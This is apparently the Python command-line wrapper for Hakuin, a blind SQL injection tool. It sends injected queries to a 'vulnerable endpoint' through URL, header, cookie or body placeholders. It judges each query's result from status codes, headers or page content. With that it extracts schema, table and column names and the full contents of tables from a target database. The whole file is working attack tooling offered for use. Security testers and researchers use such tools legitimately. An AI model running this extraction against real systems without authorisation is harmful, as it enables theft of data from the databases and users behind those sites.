import argparse
import asyncio
import importlib.util
import inspect
import json
import re
import sys
import tqdm
import urllib.parse

import aiohttp

from hakuin.dbms import DBMS_DICT
from hakuin import Extractor, Requester



class BytesEncoder(json.JSONEncoder):
    def default(self, o):
        return o.hex() if isinstance(o, bytes) else super().default(o)



class UniversalRequester(Requester):
    RE_INFERENCE = re.compile(r'^(not_)?(.+):(.*)$')
    RE_QUERY_TAG = re.compile(r'{query}')


    def __init__(self, args):
        super().__init__()
        self.http = None
        self.url = args.url
        self.method = args.method
        self.headers = self._process_dict(args.headers)
        self.cookies = self._process_dict(args.cookies)
        self.body = args.body
        self.inference = self._process_inference(args.inference)
        self.dbg = args.dbg


    async def initialize(self):
        self.http = aiohttp.ClientSession()


    async def cleanup(self):
        if self.http:
            await self.http.close()
            self.http = None


    def _process_dict(self, dict_str):
        if dict_str is None:
            return {}

        dict_str = json.loads(dict_str)
        assert type(dict_str) is dict, 'Headers/cookies must be defined as a dictionary.'

        return {str(k): str(v) for k, v in dict_str.items()}


    def _process_inference(self, inference):
        m = self.RE_INFERENCE.match(inference)

        inf = {
            'type': m.group(2),
            'content': m.group(3),
            'is_negated': m.group(1) is not None,
        }

        assert inf['type'] in ['status', 'header', 'body'], f'Unknown inference type: "{inf["type"]}"'
        if inf['type'] == 'status':
            inf['content'] = int(inf['content'])

        return inf


    async def request(self, ctx, query):
        query = query.render(ctx)
        url = self.RE_QUERY_TAG.sub(urllib.parse.quote(query), self.url)
        headers = {self.RE_QUERY_TAG.sub(query, k): self.RE_QUERY_TAG.sub(query, v) for k, v in self.headers.items()}
        cookies = {self.RE_QUERY_TAG.sub(query, k): self.RE_QUERY_TAG.sub(query, v) for k, v in self.cookies.items()}
        body = self.RE_QUERY_TAG.sub(query, self.body) if self.body else None

        async with self.http.request(method=self.method, url=url, headers=headers, cookies=cookies, data=body) as resp:
            if resp.status not in [200, 404]:
                tqdm.tqdm.write(f'(err) {query}')
                raise AssertionError(f'Invalid response code: {resp.status}')

            if self.inference['type'] == 'status':
                result = resp.status == self.inference['content']
            elif self.inference['type'] == 'header':
                result = any(self.inference['content'] in v for v in resp.headers.keys() + resp.headers.values())
            elif self.inference['type'] == 'body':
                content = await resp.text()
                result = self.inference['content'] in content

        if self.inference['is_negated']:
            result = not result

        if self.dbg:
            tqdm.tqdm.write(f'{await self.n_requests() + 1} {"(err)" if resp.status == 500 else str(result)[0]} {query}')

        return result



class HK:
    def __init__(self):
        self.ext = None


    async def run(self, args):
        if args.requester:
            requester = self._load_requester(args)
        else:
            requester = UniversalRequester(args)

        await requester.initialize()

        self.ext = Extractor(requester=requester, dbms=args.dbms, n_tasks=args.tasks)

        try:
            await self._run(args)
        finally:
            await requester.cleanup()


    async def _run(self, args):
        if args.extract == 'data':
            if args.column:
                res = await self.ext.extract_column(table=args.table, column=args.column, schema=args.schema, text_strategy=args.text_strategy)
            elif args.table:
                res = await self.extract_table(table=args.table, schema=args.schema, meta_strategy=args.meta_strategy, text_strategy=args.text_strategy)
            else:
                res = await self.extract_tables(schema=args.schema, meta_strategy=args.meta_strategy, text_strategy=args.text_strategy)
        elif args.extract == 'meta':
            res = await self.ext.extract_meta(schema=args.schema, strategy=args.meta_strategy)
        elif args.extract == 'schemas':
            res = await self.ext.extract_schema_names(strategy=args.meta_strategy)
        elif args.extract == 'tables':
            res = await self.ext.extract_table_names(schema=args.schema, strategy=args.meta_strategy)
        elif args.extract == 'columns':
            res = await self.ext.extract_column_names(table=args.table, schema=args.schema, strategy=args.meta_strategy)

        res = {
            'stats': {
                'n_requests': await self.ext.requester.n_requests(),
            },
            'data': res,
        }
        print(json.dumps(res, cls=BytesEncoder, indent=4))


    async def extract_tables(self, schema, meta_strategy, text_strategy):
        res = {}
        for table in await self.ext.extract_table_names(schema=schema, strategy=meta_strategy):
            res[table] = await self.extract_table(table, schema, meta_strategy, text_strategy)
        return res


    async def extract_table(self, table, schema, meta_strategy, text_strategy):
        res = {}
        for column in await self.ext.extract_column_names(table=table, schema=schema, strategy=meta_strategy):
            try:
                res[column] = await self.ext.extract_column(table=table, column=column, schema=schema, text_strategy=text_strategy)
            except Exception as e:
                res[column] = None
                tqdm.tqdm.write(f'(err) Failed to extract "{table}.{column}": {e}')
        return res


    def _load_requester(self, args):
        assert ':' in args.requester, f'Invalid requester format (path/to/requester.py:MyRequesterClass): "{args.requester}"'
        req_path, req_cls = args.requester.rsplit(':', -1)

        spec = importlib.util.spec_from_file_location('_custom_requester', req_path)
        assert spec, f'Failed to locate "{req_path}"'
        module = importlib.util.module_from_spec(spec)
        assert module, f'Failed to locate "{req_path}"'
        spec.loader.exec_module(module)

        for cls_name, obj in inspect.getmembers(module, inspect.isclass):
            if cls_name != req_cls:
                continue
            if issubclass(obj, Requester) and obj is not Requester:
                return obj()

        raise ValueError(f'Requester class "{req_cls}" not found in "{req_path}".')



def main():
    parser = argparse.ArgumentParser(description='A simple wrapper to easily call Hakuin\'s basic functionality.')
    parser.add_argument('url', help='URL pointing to a vulnerable endpoint. The URL can contain the {query} tag, which will be replaced with injected queries.')
    parser.add_argument('-T', '--tasks', default=1, type=int, help='Run several coroutines in parallel.')
    parser.add_argument('-D', '--dbms', required=True, choices=DBMS_DICT.keys(), help='Assume this DBMS engine.')
    parser.add_argument('-M', '--method', choices=['get', 'post', 'put', 'delete', 'head', 'patch'], default='get', help='HTTP request method.')
    parser.add_argument('-H', '--headers', help='Headers attached to requests. The header names and values can contain the {query} tag.')
    parser.add_argument('-C', '--cookies', help='Cookies attached to requests. The cookie names and values can contain the {query} tag.')
    parser.add_argument('-B', '--body', help='Request body. The body can contain the {query} tag.')
    parser.add_argument('-i', '--inference', help=''
        'Inference method that determines the results of injected queries. The method must be in the form of "<TYPE>:<CONTENT>", where the <TYPE> '
        'can be "status", "header", or "body" and the <CONTENT> can be a status code or a string to look for in HTTP responses. Also, the <TYPE> '
        'can be prefixed with "not_" to negate the expression. Examples: "status:200" (check if the response status code is 200), "not_status:404" '
        '(the response status code is not 404), "header:found" (the response header name or value contains "found"), "body:found" (the response body '
        'contains "found").'
    )
    parser.add_argument('-x', '--extract', choices=['data', 'meta', 'schemas', 'tables', 'columns'], default='data', help='Target to extract - '
        '"schemas" extracts names of schemas, "tables" extracts names of tables, "columns" extracts names of columns, "meta" extracts both table and '
        'column names, and "data" extracts data within the selected DB object. If not provided, "data" is used.'
    )
    parser.add_argument('-s', '--schema', help='Select this schema. If not provided, the current schema is selected.')
    parser.add_argument('-t', '--table', help='Select this table. If not provided, all tables are selected.')
    parser.add_argument('-c', '--column', help='Select this column. If not provided, all columns are selected.')

    parser.add_argument('--meta_strategy', choices=['binary', 'model'], default='model', help=''
        'Use this strategy to extract metadata (schema, table, and column names). If not provided, "model" is used.'
    )
    parser.add_argument('--text_strategy', choices=['dynamic', 'binary', 'unigram', 'fivegram'], default='dynamic', help=''
        'Use this strategy to extract text columns. If not provided, "dynamic" is used.'
    )

    parser.add_argument('-R', '--requester', help='Use custom Requester class instead of the default one. '
        'Example: path/to/requester.py:MyRequesterClass'
    )
    # parser.add_argument('-o', '--out', help='Output directory.')
    parser.add_argument('--dbg', action='store_true', help='Print debug information to stderr.')
    args = parser.parse_args()

    if args.extract == 'meta':
        assert not args.table and not args.column, 'You cannot combine --extract=meta with --table or --column.'
    elif args.extract == 'schemas':
        assert not args.table and not args.column, 'You cannot combine --extract=schemas with --schema, --table, or --column.'
    elif args.extract == 'tables':
        assert not args.table and not args.column, 'You cannot combine --extract=tables with --table or --column.'
    elif args.extract == 'columns':
        assert not args.column, 'You cannot combine --extract=columns with --column.'
        assert args.table, 'You must specify --table when using --extract=columns.'

    if args.column:
        assert args.table, 'You must specify --table when using --column.'

    assert args.tasks > 0, 'The --tasks parameter must be positive.'

    assert args.inference or args.requester, 'You must provide -i/--inference or -R/--requester.'

    asyncio.get_event_loop().run_until_complete(HK().run(args))


if __name__ == '__main__':
    main()